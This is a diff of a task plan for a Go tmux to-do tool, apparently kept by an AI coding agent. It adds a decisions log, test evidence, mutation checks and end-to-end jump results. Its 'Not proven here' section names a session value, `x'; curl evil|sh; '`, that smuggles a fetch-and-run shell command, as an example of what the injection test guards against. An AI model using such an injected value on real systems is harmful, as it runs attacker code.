@@ -1,7 +1,7 @@
 # All-tasks View With Sesh Jump
 
-**Status:** ready
-**Worktree:** none
+**Status:** review
+**Worktree:** none (merged and removed)
 
 ## Goal
 `g` toggles a wide view of every task in the database grouped by scope — including scopes
@@ -240,6 +240,59 @@ merged code, not against the plan for it — but note the line numbers it cites 
 `bubbles/textinput` pulls in an unvendored `atotto/clipboard`), so the input row this task
 reuses is `field`, not `textinput`.
 
+### 2026-08-20 (executor) — six `how` revisions, logged
+
+The plan held. Six details it did not specify, all of them *how* rather than *what*:
+
+1. **The row type is `listRow`, not `row`.** `internal/tui/render_test.go` already has a
+   test-local helper called `row`. Renaming the production type rather than the test is what
+   kept step 1's rule — every existing merged-view test passes unedited — genuinely intact
+   instead of nearly intact.
+2. **Group delete is bound to `D`.** `design.md:141` says stale groups "support re-home (`r`)
+   and delete" without naming a key, and DoD 17's list does not include one. `D` pairs with
+   `d`, and the shift is the friction a group-sized action deserves. Recorded in design.md.
+3. **The delete queue became a stack of *steps*, `[][]int64`.** DoD 15 wants one `u` to
+   restore a whole group, and a flat `[]int64` gave one `u` per *row* — group delete needed
+   three. The queue's unit is now one keypress, which is what the user experiences either
+   way; `queuedIDs()` flattens it for the three callers that want ids (the view filter, the
+   commit, the empty-state count). Three call sites in `delete_test.go` were adapted to the
+   new type; no assertion was weakened.
+4. **`1`/`2`/`3` in the all-tasks view filter by *tier*, in the model, not by scope.** The
+   merged view's filter narrows `Filter.Scopes` to the active scopes of one tier, and doing
+   that here would hide exactly the inactive keys the view exists to surface. `visibleGroups`
+   drops groups of the wrong kind instead, so no store change was needed. The filter is a
+   property of the popup, not of one view, so it survives `g` — pinned by a test.
+5. **Rows in the wide view carry no checkbox.** `design.md:130`'s mock showed `[ ]`, which
+   predates the shipped merged view's resolution of done-state as a strikethrough. Two
+   different done-markers in two views would be a rule to learn for no gain; the mock is
+   updated to match.
+6. **`Run`'s help overlay and `TestUnhandledKeysDoNothing` needed the two edits the DoD
+   implies.** `helpLines` gained a `viewKind` (DoD 19) — two call sites adapted, one of them
+   *strengthened* to cover both views — and `g` came off the unhandled-keys list, which its
+   own comment had reserved for this task. `enter`, `r` and `D` went onto that list instead,
+   so their merged-view inertness is now pinned.
+
+**Extra coverage beyond the DoD, both from CLAUDE.md pitfalls.** `TestDoesNotImportExec`
+makes DoD 11 structural rather than reviewed. And every new guard was mutation-checked before
+being believed: deleting the drop-empty-groups step, neutering `snapCursor`, removing the
+header width budget, and miscounting `chromeHeight` each fail the test that claims to cover
+them (1876 assertions for the last one). See Evidence.
+
+**CLAUDE.md candidates for close-out** (left to the curator, who owns Step 7):
+- A test-local helper can block a production type name; rename the type, not the test, when a
+  refactor's whole safety argument is "no test changed".
+- `store.groupedOrder` sorts groups by `scope_key` *ascending* inside a tier, not by recency.
+  The first expectation written for the all-tasks view got this wrong; "newest first" applies
+  only *within* a group.
+- `store.DefaultPath` uses `AppDir = "tmux-todo"`, not `tdo` — the capture-pane recipe in
+  CLAUDE.md says "`$XDG_DATA_HOME`" without saying the subdirectory, and seeding
+  `$XDG/tdo/tasks.db` produces a popup that opens cleanly and shows "no tasks yet", which
+  looks like a view bug rather than a path typo.
+- An attached client can be manufactured for a *jump* test the same way the popup probe does
+  it, and the assertion is `list-clients -F '#{client_session}'` before and after. Running
+  `tdo tui` via `send-keys` into a pane (rather than as the session's command) keeps the
+  session alive after the jump, so the "after" reading is not racing the session's death.
+
 ## Plan
 **Approved at Checkpoint 1 on 2026-08-20**, including the curator's re-home ruling. Held at
 `agreed` on the user's instruction until `task-create-edit-rescope` is `done`; flipping to
@@ -350,4 +403,180 @@ picks attach-vs-switch and `internal/tui` stays ignorant of the distinction.
   reporting a session says nothing about whether *this* process has a client.
 
 ## Evidence
-(Added by the executor.)
+
+### Sweep (DoD 21)
+
+```
+$ make test
+ok  github.com/agusarias/tmux-todo/internal/cli    0.480s
+ok  github.com/agusarias/tmux-todo/internal/scope  1.179s
+ok  github.com/agusarias/tmux-todo/internal/store  1.082s
+ok  github.com/agusarias/tmux-todo/internal/task   1.085s
+ok  github.com/agusarias/tmux-todo/internal/tui    6.636s
+
+$ make lint          # go vet ./... + gofmt check
+(no output)
+$ gofmt -l .
+(empty)
+
+$ CGO_ENABLED=0 make build && otool -L bin/tdo
+bin/tdo:
+	/usr/lib/libSystem.B.dylib
+	/usr/lib/libresolv.9.dylib
+```
+
+No libsqlite3: the pure-Go driver still holds.
+
+### The named tests (Verification section)
+
+```
+--- PASS: TestHeadersAreNotSelectable                        (DoD 6)
+--- PASS: TestLivenessComesFromConfigAlone                   (DoD 4)
+--- PASS: TestEnterOnDirOrGlobalIsANoOp                      (DoD 10)
+--- PASS: TestQueuedDeletesCommitBeforeTheJump               (DoD 12)
+--- PASS: TestRehomeMovesTheWholeGroup                       (DoD 14)
+--- PASS: TestGroupDeleteQueuesEveryTaskAndOneUndoRestoresThemAll  (DoD 15)
+--- PASS: TestAFullyQueuedGroupDisappearsHeaderAndAll        (DoD 16)
+--- PASS: TestALongSessionNameDoesNotEatTheJumpHint          (header width budget)
+--- PASS: TestAllTasksRowsAndHeadersNeverExceedTheirWidth    (headers, 8 widths)
+internal/cli:
+--- PASS: TestJumpInvocationTable                            (DoD 8, 9, + outside-tmux)
+--- PASS: TestSessionNamesAreNeverReparsedByAShell           (DoD 13)
+internal/scope:
+--- PASS: TestLiveSessionsParsesOneNamePerLine
+--- PASS: TestLiveSessionsWithNoServerIsEmptyNotAnError
+--- PASS: TestLiveSessionsDoesNotShortCircuitOutsideTmux
+--- PASS: TestLiveSessionsAgainstARealServer                 (production path, skippable)
+```
+
+`TestFrameNeverExceedsThePane` now runs **1296** subtests (a `view=all` leg alongside
+`view=merged`, across 3 versions x 9 sizes x 4 filters x 6 modes), asserted on the unclamped
+`frame()` with the `clampHeight` backstop proven not to have fired.
+
+### The refactor's own guard (Plan step 1)
+
+The row-model refactor landed with **every existing `internal/tui` test passing unedited**.
+The only test-file edits in this task are the ones its own DoD forces, each named in the
+Decisions log: two `run()` call sites (the sanctioned `(Jump, error)` signature change), two
+`helpLines` call sites (DoD 19 — one *widened* to cover both views), three `m.queued` type
+sites (the undo-step change), and `g` moving off `TestUnhandledKeysDoNothing`'s list, which
+that test's own comment had reserved for this task. `enter`/`r`/`D` replaced it there.
+
+### Mutation checks — the guards discriminate
+
+Each new guard was broken deliberately and re-run, per CLAUDE.md's "a green test whose
+subject is gone is evidence of nothing":
+
+| mutation | test that failed |
+|---|---|
+| `visibleGroups` keeps groups that came out empty | `TestAFullyQueuedGroupDisappearsHeaderAndAll`: `headers = [{session api} {global }]` |
+| `snapCursor` returns early (headers selectable) | `TestHeadersAreNotSelectable`: `cursor 0 landed on a header ({session api})` |
+| `renderHeader` drops the hint's width budget | `TestALongSessionNameDoesNotEatTheJumpHint`: `width 42: header is 50 columns` |
+| `chromeHeight = 5` | `TestFrameNeverExceedsThePane`: 1876 assertions |
+
+### capture-pane from a real tmux pane (DoD 22)
+
+Private socket, `$XDG_DATA_HOME` pointed at a temp dir, schema via `tdo doctor --db`, rows
+seeded with the `sqlite3` CLI. Session `work` exists on that server; `api` deliberately does
+not, and the two dir keys are one active and one stranded.
+
+```
+=== MERGED VIEW (active scopes only) ===
+│  tdo                                                            │
+│                                                                 │
+│  ▸ ⌘ rebase onto main                        (session: work)     │
+│    ⌘ check CI                                                    │
+│    · update README                    (dir: ~/workspace/todo)    │
+│    ◉ call the dentist                        (global)            │
+│  j/k move · space done · ? keys · q quit                         │
+
+=== ALL-TASKS VIEW (after g) ===
+│  ─ SESSION api ─ (not running)                          ↵ sesh   │
+│  ▸ fix flaky test                                                │
+│    restart the worker                                            │
+│  ─ SESSION work ─ (live)                              ↵ switch   │
+│    rebase onto main                                              │
+│    check CI                                                      │
+│  ─ DIR ~/workspace/todo ─                                        │
+│    update README                                                 │
+│  ─ DIR ~/ws/other-project ─                                      │
+│    someone elses repo                                            │
+│  ─ GLOBAL ─                                                      │
+│    call the dentist                                              │
+```
+
+A live group, a not-running group, two dir groups (one of them a key this context has no
+scope for) and a global group — and `someone elses repo` is a row the merged view above
+cannot see at all, which is the feature.
+
+`capture-pane -pe`, since lipgloss renders plain in a test process:
+
+```
+^[[2m─ SESSION api ─ (not running)^[[0m       ^[[2m↵ sesh^[[0m
+^[[2m─ SESSION work ─ (live)^[[0m             ^[[2m↵ switch^[[0m
+```
+
+The `?` overlay in that view (DoD 19):
+
+```
+│  j/k move · space done · q quit          │
+│  a add · e edit · s re-scope              │
+│  d delete · u undo (until close)          │
+│  enter jump · r re-home · D del group     │
+│  1/2/3 filter tier · g merged view        │
+│  ? or esc closes this                     │
+│  vaae7b43-dirty                           │
+```
+
+### A real end-to-end jump (DoD 23)
+
+Private socket, an attached client manufactured headlessly (`TMUX= tmux -L <sock> attach -t
+work` from inside another session's pane), `tdo tui` sent into `work`'s pane.
+`list-clients -F '#{client_session}'` before and after, all three branches:
+
+```
+############ CASE A: live session -> tmux switch-client ############
+client session BEFORE: work
+  ─ SESSION ghost ─ (not running)                         ↵ sesh
+    stranded in a dead session
+  ─ SESSION other ─ (live)                              ↵ switch
+  ▸ waiting in a live session          <- Enter pressed here
+client session AFTER:  other
+sessions now:          other outer work
+
+############ CASE B: not-running session -> sesh connect -s ############
+client session BEFORE: work
+  ▸ stranded in a dead session         <- Enter pressed here (ghost, not running)
+client session AFTER:  ghost
+sessions now:          ghost other outer work
+
+############ CASE C: not-running, sesh NOT on PATH -> tmux fallback ############
+# PATH for tdo: /var/folders/.../bin:/usr/bin:/bin  (sesh present: no)
+client session BEFORE: work
+  ▸ stranded in a dead session         <- Enter pressed here
+client session AFTER:  ghost
+sessions now:          ghost other outer work
+```
+
+Case C is the `sesh`-absent run the Verification section asks for: a PATH holding `tmux` and
+`sqlite3` but no `sesh`, and the client still lands in `ghost` — created by
+`tmux new-session -d` + `switch-client`. `tdo` works fully without `sesh`.
+
+### Not proven here
+
+- **DoD 13 end to end.** The metacharacter safety is pinned on the argv, in
+  `TestSessionNamesAreNeverReparsedByAShell`, across all five commands the table can issue —
+  not by creating a tmux session named `x'; curl evil|sh; '`. The argv assertion is the
+  stronger of the two: it fails on the *cause* (a name split, quoted or spliced) rather than
+  on whether one particular payload happened to be harmless.
+- **A session name containing `:`** cannot be a tmux target at all, so it cannot be jumped
+  to. That is a tmux limit the rename hook already documents; re-home is the way out, and it
+  works on such a group.
+
+### Merge
+
+Branch `all-tasks-view`, commit `2978ae0`, merged into local `main` with `--no-ff` and the
+worktree removed. Not pushed — that stays the user's call via the curator. The merge commit
+hash is recorded in the line below, added on `main` after the merge.
+
+Merge commit: `<recorded below>`
